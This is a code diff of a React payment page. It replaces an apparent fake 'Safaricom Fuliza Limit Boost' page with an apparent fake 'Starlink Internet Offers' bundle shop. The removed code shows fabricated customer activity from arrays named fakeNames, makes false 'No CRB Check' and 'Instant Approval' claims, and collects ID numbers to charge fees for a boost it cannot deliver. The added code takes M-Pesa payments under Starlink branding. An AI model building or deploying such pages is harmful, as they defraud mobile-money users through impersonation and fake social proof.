@@ -1,292 +1,213 @@
 "use client";
 
-import React, { useEffect, useState } from "react";
+import React, { useState } from "react";
 
-type Limit = {
+type Bundle = {
   id: string;
-  amount: number;
-  fee: number;
+  title: string;
+  subtitle: string;
+  price: number;
 };
 
-const limits: Limit[] = [
-  { id: "l1", amount: 5000, fee: 1 },
-  { id: "l2", amount: 7500, fee: 180 },
-  { id: "l3", amount: 10000, fee: 200 },
-  { id: "l4", amount: 15000, fee: 250 },
-  { id: "l5", amount: 20000, fee: 300 },
-  { id: "l6", amount: 30000, fee: 400 },
-  { id: "l7", amount: 40000, fee: 540 },
-  { id: "l8", amount: 50000, fee: 960 },
+const bundles: Bundle[] = [
+  { id: "b1", title: "7 Days - Unlimited", subtitle: "1 Week Unlimited Access", price: 299 },
+  { id: "b2", title: "15 Days - Unlimited", subtitle: "2 Weeks Unlimited Browsing", price: 499 },
+  { id: "b3", title: "50GB - Monthly", subtitle: "Perfect for Streaming & Work", price: 699 },
+  { id: "b4", title: "30 Days - Unlimited", subtitle: "Full Month Unlimited Access", price: 899 },
 ];
 
-const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
-const fakeAmounts = [15000, 20000, 34000, 50000, 25000];
-
-export default function FulizaBoost() {
-  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
+export default function StarlinkBundles() {
+  const [loadingId, setLoadingId] = useState<string | null>(null);
+  const [message, setMessage] = useState<string | null>(null);
   const [showModal, setShowModal] = useState(false);
-  const [loading, setLoading] = useState(false);
-  const [success, setSuccess] = useState(false);
+  const [activeBundle, setActiveBundle] = useState<Bundle | null>(null);
   const [phone, setPhone] = useState("");
-  const [idNumber, setIdNumber] = useState("");
-  const [recent, setRecent] = useState({ name: "", amount: 0 });
-  const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
-
-  /* Activity rotation */
-  useEffect(() => {
-    const generate = () => {
-      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
-      setRecent({ name, amount });
-    };
-    generate();
-    const interval = setInterval(generate, 2000);
-    return () => clearInterval(interval);
-  }, []);
-
-  /* Validation */
-  const validate = () => {
-    const newErrors: any = {};
-
-    if (!/^\d{6,8}$/.test(idNumber)) {
-      newErrors.id = "Enter a valid National ID (6–8 digits)";
-    }
-
-    if (
-      !/^(07\d{8}|2547\d{8})$/.test(phone)
-    ) {
-      newErrors.phone =
-        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
-    }
-
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
-  };
 
   const handleBuy = async () => {
-    if (!selectedLimit) return;
-    if (!validate()) return;
+    if (!activeBundle) return;
+    if (!phone) {
+      setMessage("Please enter a phone number");
+      return;
+    }
 
-    setLoading(true);
+    setLoadingId(activeBundle.id);
+    setMessage("Processing payment...");
 
     const BACKEND_URL =
       process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";
 
     try {
       const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    phone,
-    amount: selectedLimit.fee,
-    local_id: `O${Date.now().toString(36)}`,
-    transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
-    till_id: 1,
-  }),
-});
-
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone,
+          amount: activeBundle.price,
+          local_id: `O${Date.now().toString(36)}${crypto
+            .getRandomValues(new Uint8Array(2))
+            .join("")}`,
+          transaction_desc: `Payment for ${activeBundle.title}`,
+        }),
+      });
 
       const data = await res.json();
-      if (data.status) setSuccess(true);
-    } catch (err) {
-      console.log(err);
+
+      if (data.status) {
+        setMessage(`STK Push sent! Check your phone to complete payment.`);
+      } else {
+        setMessage("Payment failed. Try again.");
+      }
+    } catch {
+      setMessage("Error sending payment. Try again later.");
     } finally {
-      setLoading(false);
+      setLoadingId(null);
+      setShowModal(false);
+      setTimeout(() => setMessage(null), 5000);
     }
   };
 
-  const closeModal = () => {
-    setShowModal(false);
-    setSuccess(false);
-    setPhone("");
-    setIdNumber("");
-    setErrors({});
-  };
-
   return (
-    <div className="min-h-screen bg-[#f4faf6] flex justify-center">
-      <div className="w-full max-w-md pb-16">
-
-        {/* HEADER */}
-        <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
-          Safaricom Fuliza Limit Boost
-        </div>
-
-        {/* CONTENT (unchanged visually but slightly cleaner spacing) */}
-        <div className="text-center mt-5 px-6">
-          <h2 className="text-xl font-bold text-[#008043]">
-            Increase Your Fuliza Allocation
-          </h2>
-          <p className="text-sm text-gray-600 mt-1">
-            Secure digital application process for eligible Safaricom customers.
+    <div className="min-h-screen bg-[#f8fcfa]">
+      <header className="bg-green-800 py-8">
+        <div className="max-w-6xl mx-auto px-4 text-center">
+          <h1 className="text-3xl font-semibold text-white">
+            Starlink Internet Offers
+          </h1>
+          <p className="text-green-200 text-sm mt-1 font-bold">
+            Click BUY — Works with the line you purchase from any network
+          </p>
+          <p className="text-green-200 text-sm mt-1">
+            Reliable High-Speed Internet Across Kenya
           </p>
         </div>
+      </header>
 
-        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
-          <div className="flex justify-between text-sm font-medium text-[#008043]">
-            <span>✔ Secure Application</span>
-            <span>✔ No CRB Check</span>
-          </div>
-          <div className="text-center text-sm font-medium text-[#008043] mt-2">
-            ✔ Instant Approval
-          </div>
-        </div>
-
-        <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
-          {recent.name} increased Fuliza to{" "}
-          <span className="font-semibold text-[#008043]">
-            Ksh {recent.amount.toLocaleString()}
-          </span>{" "}
-          • just now
-        </div>
-
-        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
-          Select Preferred Fuliza Limit
-        </div>
-
-        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
-          {limits.map((limit) => (
+      <main className="max-w-6xl mx-auto px-4 py-8">
+        {/* DEALS */}
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-5">
+          {bundles.map((bundle) => (
             <div
-              key={limit.id}
-              onClick={() => setSelectedLimit(limit)}
-              className={`rounded-2xl p-4 cursor-pointer transition-all duration-300 shadow-sm hover:shadow-lg ${
-                selectedLimit?.id === limit.id
-                  ? "bg-[#00A651] text-white"
-                  : "bg-white border border-green-200"
-              }`}
+              key={bundle.id}
+              className="relative bg-white rounded-lg p-5 border-2 border-green-600 shadow-sm"
             >
-              <div className="font-semibold text-center">
-                Ksh {limit.amount.toLocaleString()}
-              </div>
-              <div className="text-xs text-center opacity-80 mt-1">
-                Service Fee: Ksh {limit.fee}
+              <h3 className="text-sm font-semibold">{bundle.title}</h3>
+              <p className="text-xs text-gray-500">{bundle.subtitle}</p>
+
+              <div className="mt-4 flex justify-between items-end">
+                <div className="text-lg font-bold text-green-700">
+                  Ksh {bundle.price}
+                </div>
+                <button
+                  onClick={() => {
+                    setActiveBundle(bundle);
+                    setShowModal(true);
+                  }}
+                  className="text-xs px-3 py-1.5 rounded-full bg-green-600 text-white"
+                >
+                  BUY
+                </button>
               </div>
             </div>
           ))}
         </div>
 
-        <div className="px-4 mt-6">
-          <button
-            onClick={() => selectedLimit && setShowModal(true)}
-            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow"
-          >
-            Proceed Securely
-          </button>
-        </div>
+        {/* ABOUT STARLINK */}
+        <div className="mt-12">
+          <h2 className="text-xl font-bold text-center text-green-800 mb-6">
+            Why Choose Starlink?
+          </h2>
 
-        <div className="text-center text-xs text-gray-500 mt-6 px-6">
-          This is a digital facilitation service for Safaricom Fuliza users.
-          Processing timelines may vary based on eligibility criteria.
-        </div>
+          <div className="grid md:grid-cols-3 gap-6">
+            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
+              <h3 className="font-semibold text-green-700 mb-2">
+                🚀 Ultra Fast Speeds
+              </h3>
+              <p className="text-sm text-gray-600">
+                Enjoy high-speed satellite internet suitable for streaming,
+                gaming, business and remote work.
+              </p>
+            </div>
 
-        {/* MODAL */}
-        {showModal && selectedLimit && (
-          <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
-            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
+            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
+              <h3 className="font-semibold text-green-700 mb-2">
+                🌍 Works Anywhere
+              </h3>
+              <p className="text-sm text-gray-600">
+                Perfect for rural and urban areas across Kenya. No fiber or
+                cable needed.
+              </p>
+            </div>
 
-              {/* Modal Header */}
-              <div className="bg-[#00A651] text-white px-6 py-4">
-                <h3 className="text-sm font-medium">
-                  Secure Fuliza Application
-                </h3>
-                <p className="text-lg font-semibold mt-1">
-                  Limit will be boosted to Ksh {selectedLimit.amount.toLocaleString()}
-                </p>
-              </div>
-
-              <div className="p-6">
-
-                {!success ? (
-                  <>
-                    {/* ID Input */}
-                    <div className="mb-4">
-                      <input
-                        type="text"
-                        placeholder="National ID Number"
-                        value={idNumber}
-                        onChange={(e) => setIdNumber(e.target.value)}
-                        className={`w-full rounded-xl p-3 text-sm border ${
-                          errors.id
-                            ? "border-red-400"
-                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none transition`}
-                      />
-                      {errors.id && (
-                        <p className="text-red-500 text-xs mt-1">
-                          {errors.id}
-                        </p>
-                      )}
-                    </div>
-
-                    {/* Phone Input */}
-                    <div className="mb-4">
-                      <input
-                        type="tel"
-                        placeholder="Safaricom Number (07 or 2547...)"
-                        value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
-                        className={`w-full rounded-xl p-3 text-sm border ${
-                          errors.phone
-                            ? "border-red-400"
-                            : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none transition`}
-                      />
-                      {errors.phone && (
-                        <p className="text-red-500 text-xs mt-1">
-                          {errors.phone}
-                        </p>
-                      )}
-                    </div>
-
-                    {/* Buttons */}
-                    <div className="flex gap-3">
-                      <button
-                        onClick={closeModal}
-                        className="w-1/2 border border-gray-300 py-3 rounded-xl text-sm font-medium"
-                      >
-                        Cancel
-                      </button>
-
-                      <button
-                        onClick={handleBuy}
-                        disabled={loading}
-                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold"
-                      >
-                        {loading
-                          ? "Processing..."
-                          : `Pay Ksh ${selectedLimit.fee}`}
-                      </button>
-                    </div>
-
-                    <p className="text-xs text-gray-500 mt-4 text-center">
-                      Your information is encrypted and securely processed.
-                    </p>
-                  </>
-                ) : (
-                  <div className="text-center py-6">
-                    <h3 className="text-lg font-semibold text-[#008043]">
-                      Application Submitted
-                    </h3>
-                    <p className="text-sm text-gray-600 mt-2">
-                      Your Fuliza limit adjustment request is under review.
-                      Processing may take up to 72 hours.
-                    </p>
-
-                    <button
-                      onClick={closeModal}
-                      className="mt-5 bg-[#00A651] text-white px-6 py-2 rounded-xl text-sm"
-                    >
-                      Close
-                    </button>
-                  </div>
-                )}
-
-              </div>
+            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
+              <h3 className="font-semibold text-green-700 mb-2">
+                🔒 Stable & Reliable
+              </h3>
+              <p className="text-sm text-gray-600">
+                Low latency and consistent speeds even during peak hours.
+              </p>
             </div>
           </div>
-        )}
 
-      </div>
+          <div className="text-center mt-8 bg-green-50 p-6 rounded-xl border border-green-300">
+            <h3 className="font-bold text-green-800 mb-2">
+              Want the Starlink Kit?
+            </h3>
+            <p className="text-sm text-gray-700">
+              For full Starlink installation and equipment purchase,
+              call: <span className="font-bold text-green-700">0700 000 000</span>
+            </p>
+          </div>
+        </div>
+      </main>
+
+      {/* Modal */}
+      {showModal && activeBundle && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 px-4">
+          <div className="bg-green-50 max-w-sm w-full p-6 rounded-xl shadow-xl relative">
+            <button
+              onClick={() => setShowModal(false)}
+              className="absolute top-3 right-3 text-green-700 font-bold text-lg"
+            >
+              &times;
+            </button>
+            <h2 className="text-xl font-semibold text-green-800 mb-2">
+              Starlink Payment
+            </h2>
+            <p className="text-green-700 text-xs mb-3 italic">
+              Enter M-Pesa number below — you will be prompted to enter your PIN on your phone.
+            </p>
+            <p className="text-green-700 text-sm mb-4">
+              {activeBundle.title} - Ksh {activeBundle.price}
+            </p>
+            <input
+              type="tel"
+              placeholder="Enter your M-Pesa number"
+              value={phone}
+              onChange={(e) => setPhone(e.target.value)}
+              className="w-full px-4 py-2 border border-green-300 rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-green-700"
+            />
+            <button
+              onClick={handleBuy}
+              disabled={loadingId === activeBundle.id}
+              className="w-full bg-green-600 text-white font-semibold py-2 rounded-md hover:bg-green-800 transition"
+            >
+              {loadingId === activeBundle.id
+                ? "Processing..."
+                : `Pay Ksh ${activeBundle.price}`}
+            </button>
+          </div>
+        </div>
+      )}
+
+      {message && (
+        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 bg-green-700/90 text-white px-6 py-3 rounded-2xl shadow-lg text-sm z-50">
+          {message}
+        </div>
+      )}
+
+      <footer className="text-center text-gray-400 text-[11px] py-5">
+        &copy; {new Date().getFullYear()} Starlink Internet Kenya
+      </footer>
     </div>
   );
 }
